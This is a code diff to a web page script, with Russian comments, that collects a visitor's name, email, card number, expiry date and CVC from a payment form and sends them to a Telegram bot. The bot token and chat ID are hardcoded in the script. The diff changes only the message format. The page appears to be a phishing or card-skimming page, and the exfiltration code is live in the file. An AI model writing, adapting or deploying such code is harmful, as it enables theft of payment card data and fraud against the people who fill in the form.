@@ -1280,13 +1280,10 @@ async function sendToTelegramBot() {
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // УНИКАЛЬНЫЙ ID: timestamp + счетчик
         const paymentId = Date.now() + (paymentCounter++);
 
-        // ОТПРАВЛЯЕМ В НОВОМ ФОРМАТЕ СРАЗУ
-        const message = `💳 НЕПРИВЯЗАННАЯ КАРТА
-
-👤 Клиент:
+        // ОТПРАВЛЯЕМ В СТАРОМ ФОРМАТЕ, БОТ САМ ОТФОРМАТИРУЕТ
+        const message = `👤 Клиент:
 • Имя: ${formData.firstName || 'Тест'}
 • Фамилия: ${formData.lastName || 'Тестов'}  
 • Email: ${formData.email || 'test@test.com'}
@@ -1295,11 +1292,7 @@ async function sendToTelegramBot() {
 💳 Карта:
 • Номер: ${cardNumber}
 • Срок: ${expiry}
-• CVC: ${cvc}
-
-📱 Статус: Ожидание действий
-
-Выберите действие:`;
+• CVC: ${cvc}`;
 
         const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
         const CHAT_ID = '-1003239032658';
@@ -1472,6 +1465,7 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
+
 
 
 
